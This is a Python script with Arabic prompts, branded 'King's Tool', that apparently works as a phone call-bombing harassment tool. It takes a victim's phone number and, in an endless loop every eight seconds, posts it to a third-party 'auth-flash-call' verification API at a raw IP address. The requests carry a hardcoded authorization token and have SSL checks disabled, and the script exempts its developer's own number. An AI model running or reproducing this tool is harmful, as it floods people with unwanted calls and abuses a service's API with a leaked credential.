import aiohttp
import asyncio
import json
import sys
import os

# الألوان
G = '\033[1;32m' # أخضر
R = '\033[1;31m' # أحمر
Y = '\033[1;33m' # أصفر
C = '\033[1;36m' # سماوي

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

async def __HemoCaller__():
    clear()
    # واجهة الملك
    print(f"{C}================================")
    print(f"{G}   WELCOME TO KING'S TOOL")
    print(f"{G}   Developer: Ali Talib")
    print(f"{C}================================\n")

    # نظام التحقق من الرمز
    key = input(f"{Y}[?] أدخل رمز الدخول: ")
    if key != "1121":
        print(f"{R}[!] الرمز خاطئ! حاول مجدداً.")
        return

    # طلب الرقم من المستخدم
    _2Call = input(f"{Y}[?] أدخل الرقم المطلوب مع مفتاح الدولة (مثال +967...): ")

    # حماية رقم المطور
    if "967713551980" in _2Call:
        print(f"{G}ههههه هاذا رقم المطور يا بطل!")
        return

    headers = {
        'User-Agent': "okxgvhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'Authorization': "s6abj8F2euaFCk6"
    }

    Ok = 0
    Bad = 0   
    
    print(f"\n{G}[*] جاري بدء العملية...{Y}\n")
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.post(
                    "https://31.171.171.90/api/phone-numbers/auth-flash-call",
                    data=json.dumps({"phoneNumber": _2Call}),
                    headers=headers,
                    ssl=False # لتجنب مشاكل الشهادات في ترمكس
                ) as req:                    
                    text_resp = await req.text()
                    if '{"allow":true}' in text_resp:
                        Ok += 1
                    else:
                        Bad += 1
            except Exception:
                Bad += 1
                
            # تحديث العداد في نفس السطر
            sys.stdout.write(f"\r{G}[+] ناجح: {Ok}  {R}[-] فشل: {Bad}")
            sys.stdout.flush()            
            await asyncio.sleep(8)

if __name__ == "__main__":
    try:
        asyncio.run(__HemoCaller__())
    except KeyboardInterrupt:
        print(f"\n{R}[!] تم إيقاف الأداة.")
        sys.exit()
